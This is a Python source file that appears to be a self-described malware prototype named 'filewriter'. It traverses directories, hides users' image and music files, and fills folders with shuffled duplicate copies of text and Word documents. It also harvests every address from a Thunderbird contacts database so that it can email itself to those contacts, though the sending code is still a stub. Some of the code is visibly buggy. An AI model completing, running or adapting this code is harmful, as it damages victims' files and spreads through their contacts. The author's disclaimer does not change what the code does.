#!/usr/bin/python

"""
filewriter.py

(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os
import shutil
import platform
import sys
import random
import mimetypes
import docx
import sqlite3
from datetime import datetime
import typing
#from notify import notification


# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

FILES_TO_WRITE_PER_DIR: int = 10
LINUX = "Linux"
WINDOWS = "Windows"
TESTING_DIR = "/home/telekobold/TestVerzeichnis/filewriter_test/SS19-Test-Kopie"

# type variables:
ArbitraryType = typing.TypeVar("ArbitraryType")
ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
IntKeyArbValDict = typing.Dict[int, ArbitraryType]
IntKeyStrValDict = typing.Dict[int, str]


# --------------------------------------------------------------------------
# ----------------------- payload helper functions -------------------------
# --------------------------------------------------------------------------

def is_file_type(file: str, filetype: str) -> bool:
    """
    Tests whether the passed file is of the passed filetype.
    
    :file:     a relative or absolute file path.
    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
               "odt", "ogg", "png", "txt", "wav"
    :returns: `True` if the passed `file` is of the specified file type, 
              `False` otherwise
    """
    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
                  "jpeg" : "image/jpeg", 
                  "jpg" : "image/jpeg", 
                  "mp3" : "audio/mpeg", 
                  "mp4" : "video/mp4",
                  "odt" : "application/vnd.oasis.opendocument.text", 
                  "ogg" : "audio/ogg", 
                  "png" : "image/png", 
                  "txt" : "text/plain", 
                  "wav" : "audio/x-wav"}
    if file.endswith(filetype):
        return True
    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
    # Provide function which determines the MIME type without having 
    # the file name extension instead (otherwise, this check doesn't make much sense).
    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
        return True
    return False


def make_file_hidden(filepath: str) -> None:
    """
    Makes the past file hidden, i.e., writes a "." in front of its name.
    Assumes that `filepath` is a path to an actually existing file.
    
    :filepath: The absolute file path to the file to make hidden.
    """
    path, name = os.path.split(filepath)
    name = f".{name}"
    new_filepath = os.path.join(path, name)
    os.rename(filepath, new_filepath)


def traverse_dirs(curr_dir: str) -> None:
    """
    Recursively traverses all directories and subdirectories starting from 
    `curr_dir` and calls the appropriate processing function for each file.
    
    :curr_dir: the directory to start the traversal as absolute file name.
    """
    if os.path.islink(curr_dir):
        print("detected symlink {}".format(curr_dir)) # test output
        # TODO: Maybe do the same as for directories instead of just ignoring 
        # symlinks? -> Danger of recursiv loops
        return
    if os.path.isfile(curr_dir):
        if is_file_type(curr_dir, "txt"):
            # print("TEXT file {}".format(curr_dir)) # test output
            process_text_file(curr_dir)
        elif is_file_type(curr_dir, "docx"):
            # print("DOCX file {}".format(curr_dir)) # test output
            process_docx_file(curr_dir)
        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
            #print("image file {}".format(curr_dir)) # test output
            make_file_hidden(curr_dir)
        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
            #print("music file {}".format(curr_dir)) # test output
            make_file_hidden(curr_dir)
        """
        elif is_file_type(curr_dir, "odt"):
            print("ODT file {}".format(curr_dir)) # test output
            process_odt_file(curr_dir)
        """
    if os.path.isdir(curr_dir):
        # print("DIR {}".format(curr_dir)) # test output
        for file in os.listdir(curr_dir):
            # traverse_dirs("{}/{}".format(curr_dir, file))
            # system-independent version:
            traverse_dirs(os.path.join(curr_dir, file))
            
            
def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
    """
    Reads the passed text file line by line to a Python dictionary.
    
    :filename: the absolute file name of a text file.
    :returns:  a Python dictionary whose keys are the line numbers (integer 
               values) and the appropriate values being the content of this line 
               (string values) in the text file belonging to the passed
               `filename`.
    """
    result = {}
    # TODO: Add error handling if file opening doesn't work (e.g. because of 
    # missing access rights). In this case, just continue to the next file.
    with open(filename, "r") as file:
        lines = file.readlines()
    
    # NOTE: The line indexing starts with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_text_file_to_dict: result = {}".format(result)) # test output
    return result


def shuffle_filename(filename: str) -> str:
    # Determine the lines the text file has and use this number of lines 
    # to randomly shuffle the positions of those lines.
    # TODO: Implement shuffling
    return filename
    

def n_rand_numbers(n: int) -> typing.List[int]:
    """
    Before calling this function, please call the function `random.seed` with a 
    non-fixed value.
    
    :n:       The length of the list to return.
    :returns: a list of n numbers between 0 and n, randomly shuffled, 
              but unique (meaning that each number appears only once in the list); 
              `None` for n <= 0.
    """
    result = []
    
    if n <= 0:
        print("For n_rand_numbers, only positive values make sense!")
        return None
    while len(result) < n:
        i = random.randint(0,n)
        if i not in result:
            result.append(i)
    
    return result


def shuffle_dict_content(dictionary: IntKeyArbValDict) -> IntKeyArbValDict:
    """
    :dictionary: an arbitrary Python dictionary
    :returns:    a Python dictionary which contains the content of the input 
                 dictionary, but with randomly shuffled values.
    """
    result = {}
    max_index = len(dictionary)-1
    if max_index >= 1:
        rand_numbers = n_rand_numbers(max_index)
    else:
        # In this case, the loop below will be run 0 times and an empty
        # dictionary is returned.
        max_index = 0
        rand_numbers = []
    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
    
    # Write the values from the input dictionary to the output dictionary in 
    # random order:
    for i in range(max_index):
        result[i] = dictionary[rand_numbers[i]]
        
    return result


def write_dict_to_text_file(dictionary: IntKeyArbValDict, filename: str) -> None:
    """
    Writes every value of `dictionary` to a new line of the text file with 
    `filename`.
    
    :dictionary: a Python dictionary
    :filename:   an absolute file name
    """
    with open(filename, "w") as file:
        for i in range(len(dictionary)):
            file.writelines(dictionary[i])
            
            
def create_filename(input_filename: str, number: int) -> str:
    """
    Converts the passed `number` to a string and writes it at the end of the 
    file name. 
    
    If the file name contains a file name extensions, the number
    is written directly before this file name extension. This is currently
    supported for the file name extensions ".txt" and ".docx".
    
    :input_filename: a relative or absolute file name
    :number:         an `int` value
    :returns:        `input_filename` with added `number`.
    """
    filename = None
    
    if input_filename.endswith(".txt"):
        filename = f"{input_filename[0:len(input_filename)-4:1]}_{str(number)}.txt"
    elif input_filename.endswith(".docx"):
        filename = f"{input_filename[0:len(input_filename)-5:1]}_{str(number)}.docx"
    else:
        filename = input_filename + str(i)
        
    return filename


def process_text_file(input_filename: str) -> None:
    """
    Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains the 
    content of the text file with the past `input_filename`, but with randomly 
    shuffled lines. The new files are created in the same directory as 
    `input_filename`'s directory.
    
    :input_filename: an absolute file name
    """
    input_file_content = read_text_file_to_dict(input_filename)
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # TODO: Replace the call of create_filename with using shuffle_filename. 
        # It should then also be checked if the same, random file name was 
        # generated twice. A re-shuffling should be triggered in this case.
        # Temporary solution: Append suffixes "1", "2", ... to the file names:
        # filename = shuffle_filename(input_filename)
        filename = create_filename(input_filename, i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_text_file(file_content, filename)
    

def write_dict_to_docx_file(dictionary: IntKeyStrValDict, filename: str) -> None:
    """
    Writes every value of `dictionary` to a new line of the docx file with 
    `filename`.
    
    :dictionary: a Python dictionary
    :filename:   the absolute file name of a docx file
    """
    document = docx.Document()
    paragraph = document.add_paragraph()
    for i in range(len(dictionary)):
        paragraph.add_run("{}\n".format(dictionary[i]))
    document.save(filename)


# TODO: Add error handling if file opening doesn't work (e.g. because of missing
# access rights). Instead, just continue to the next file.
def process_docx_file(input_filename: str) -> None:
    """
    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    input_file_content = {}
    document = docx.Document(input_filename)
    # Read out the document's text:
    # TODO: Preserve the text's formatting
    for i, p in zip(range(sys.maxsize), document.paragraphs):
        input_file_content[i] = p.text
    # TODO: Read out the document's tables
    # TODO: Read out the document's pictures
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # TODO: Replace the call of create_filename with using shuffle_filename. 
        # It should then also be checked if the same, random file name was 
        # generated twice. A re-shuffling should be triggered in this case.
        # Temporary solution: Append suffixes "1", "2", ... to the file names:
        # filename = shuffle_filename(input_filename)
        filename = create_filename(input_filename, i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_docx_file(file_content, filename)


def process_odt_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass


# --------------------------------------------------------------------------
# ---------------------- send email helper functions ------------------------
# --------------------------------------------------------------------------

    
def read_email_addresses_thunderbird() -> typing.List[str]:
    """
    :returns: a list of all email addresses contained in Thunderbird's 
              `abook.sqlite` database if this database exists, `None` otherwise.
    """
    # TODO: Search for `abook.sqlite` on the file system
    database = "/home/telekobold/TestVerzeichnis/TestVerzeichnis/PythonTest/abook.sqlite"
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database) as con:
            with con:
                cur = con.cursor()
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            return email_addresses
    else:
        return None


def send_emails_thunderbird():
    pass


def read_email_addresses_outlook():
    pass


def send_emails_outlook():
    pass



# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

"""
Search all directories and subdirectoris beginning with the passed dir, read all 
files of every browsed directory, and create FILES_TO_WRITE_PER_DIR new files 
for every read file where each file has a randomly generated file name based on 
the file name of the read file and containing the content of the read file, but 
with the words randomly shuffled.
"""
def payload() -> None:
    # TODO: The program does nothing if the passed directory doesn't exist.
    print("Started traversing dirs...") # test output
    # traverse_dirs(os.path.expanduser("~"))
    traverse_dirs(TESTING_DIR)
    print("Finished traversing dirs!") # test output

    
"""
Send this program to all email addresses in the address book of the installed 
Thunderbird or Outlook.
"""
def send_email() -> None:
    email_addresses = read_email_addresses_thunderbird()
    print(email_addresses) # test output
    # If Mozilla Thunderbird is installed, read the whole address book from 
    # Thunderbird (SQLite database) and send this program to each address of the 
    # address book.
    # If Outlook is installed, do the same for Outlook. This check only needs 
    # to be done if the operating system is Windows.
    # TODO: Ensure that emails are not sent to the FROM address.


if __name__ == "__main__":
    random.seed((datetime.now()).strftime("%H%M%S"))
    
    # Detect the installed OS:
    installed_os: str = platform.system()
    if installed_os == WINDOWS:
        print(WINDOWS)
    elif installed_os == LINUX:
        print(LINUX)
    else:
        # Other platforms are currently not supported
        sys.exit(0)
        
    # Detect which mail program is installed:
    thunderbird_install_path: str = shutil.which("thunderbird")
    if thunderbird_install_path is not None:
        print("thunderbird")
    outlook_install_path: str = shutil.which("outlook")
    if outlook_install_path is not None:
        print("outlook")
    
    payload()
    # send_email()
    #notification("You've been hacked!", message="", app_name="filewriter")
